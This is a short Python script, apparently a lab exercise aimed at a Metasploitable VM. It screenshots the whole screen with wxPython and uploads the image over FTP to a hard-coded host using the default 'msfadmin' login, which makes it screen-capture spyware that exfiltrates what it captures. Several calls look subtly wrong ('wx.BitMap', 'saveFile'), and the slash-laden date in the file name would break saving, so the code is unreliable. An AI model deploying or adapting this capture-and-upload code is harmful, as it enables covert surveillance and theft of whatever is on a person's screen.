import wx
import os
import ftplib
from datetime import datetime

# Using WxPython to capture the screen 
# Check the wxpython documentation for details on the methods used: https://www.wxpython.org/
w      = wx.App()
screen = wx.ScreenDC()
size   = screen.GetSize()
bmap   = wx.BitMap(size[0], size[1])
memory = wx.MemoryDC(bmap)
memory.Blit(0, 0, size[0], size[1], screen, 0, 0)

# Get the current date and time to label the screen grab file 
now = datetime.now()
dt_string = now.strftime("%d/%m/%Y %H:%M:%S")

# Delete the memory object before saving the screenshot
del memory
bmap.saveFile(f"screen-grab_{dt_string}.png")

# Store ftp server information, could be changed to take in as command line args
ftp_server_ip = "192.168.0.1"
ftp_server_user = "msfadmin"
ftp_server_pass = "msfadmin"

# Create a session using the information, open the file to  read binaries, store the binaries on the FTP server 
sess_ = ftplib.FTP(ftp_server_ip, ftp_server_user, ftp_server_pass)
file_ = open(f"screen-grab_{dt_string}.png", "rb")
sess_.storbinary(f"STOR /tmp/screen-grab_{dt_string}.png", file_)

# Close the file and quit the ftp session
file_.close()
sess_.quit()